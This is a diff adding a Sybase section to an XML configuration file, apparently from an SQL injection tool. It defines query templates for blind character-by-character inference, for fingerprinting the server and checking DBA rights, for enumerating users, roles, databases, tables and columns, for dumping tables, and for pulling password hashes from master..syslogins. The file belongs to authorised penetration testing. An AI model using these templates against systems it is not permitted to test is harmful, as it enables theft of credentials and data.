@@ -1,0 +1,68 @@
+    <!-- Sybase -->
+    <dbms value="Sybase">
+        <cast query="CONVERT(VARCHAR(4000),%s)"/>
+        <length query="LTRIM(STR(LEN(%s)))"/>
+        <isnull query="ISNULL(%s,' ')"/>
+        <delimiter query="+"/>
+        <limit query="SELECT TOP %d "/>
+        <limitregexp query="TOP\s+([\d]+)\s+.+?\s+FROM\s+.+?\s+WHERE\s+.+?\s+NOT\s+IN\s+\(SELECT\s+TOP\s+([\d]+)\s+"/>
+        <limitgroupstart query="2"/>
+        <limitgroupstop query="1"/>
+        <limitstring/>
+        <order query="ORDER BY %s ASC"/>
+        <count query="COUNT(%s)"/>
+        <comment query="--" query2="/*"/>
+        <substring query="SUBSTRING((%s),%d,%d)"/>
+        <concatenate query="%s+%s"/>
+        <case query="SELECT (CASE WHEN (%s) THEN '1' ELSE '0' END)"/>
+        <hex query="BINTOSTR(CONVERT(VARBINARY,%s))"/>
+        <inference query="ASCII(SUBSTRING((%s),%d,1))>%d"/>
+        <banner query="SELECT @@VERSION"/>
+        <current_user query="SELECT SUSER_NAME()"/>
+        <current_db query="SELECT DB_NAME()"/>
+        <hostname/>
+        <table_comment/>
+        <column_comment/>
+        <is_dba query="PATINDEX('%sa_role%',SHOW_ROLE())>0" query2="EXISTS(SELECT * FROM master..syslogins,master..sysloginroles WHERE srid=0 and name='%s')"/>
+        <users>
+            <inband query="SELECT name FROM master..syslogins"/>
+            <blind/>
+        </users>
+        <passwords>
+            <inband query="SELECT name,password FROM master..syslogins" condition="name"/>
+            <blind/>
+        </passwords>
+        <privileges/>
+        <roles>
+            <inband query="SELECT name,srid FROM master..syslogins,master..sysloginroles" condition="name"/>
+            <blind/>
+        </roles>
+        <dbs>
+            <inband query="SELECT name FROM master..sysdatabases"/>
+            <blind/>
+        </dbs>
+        <tables>
+            <inband query="SELECT name FROM %s..sysobjects WHERE type IN ('U')"/>
+            <blind/>
+        </tables>
+        <columns>
+            <inband query="SELECT %s..syscolumns.name,%s..syscolumns.usertype FROM %s..syscolumns,%s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id AND %s..sysobjects.name='%s'" condition="[DB]..syscolumns.name"/>
+            <blind/>
+        </columns>
+        <dump_table>
+            <inband query="SELECT %s FROM %s.%s"/>
+            <blind query="SELECT MIN(%s) FROM %s WHERE CONVERT(VARCHAR(4000),%s)>'%s'" query2="SELECT MAX(%s) FROM %s WHERE CONVERT(VARCHAR(4000),%s) LIKE '%s'" count="SELECT COUNT(*) FROM %s" count2="SELECT COUNT(*) FROM (SELECT DISTINCT %s FROM %s) AS qq"/>
+        </dump_table>
+        <search_db>
+            <inband query="SELECT name FROM master..sysdatabases WHERE %s" condition="name"/>
+            <blind/>
+        </search_db>
+        <search_table>
+            <inband query="SELECT name FROM %s..sysobjects WHERE type IN ('U') AND " condition="name" condition2="name"/>
+            <blind/>
+        </search_table>
+        <search_column>
+            <inband query="SELECT %s..sysobjects.name FROM %s..syscolumns,%s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id" condition="[DB]..syscolumns.name" condition2="[DB]..sysobjects.name"/>
+            <blind/>
+        </search_column>
+    </dbms>
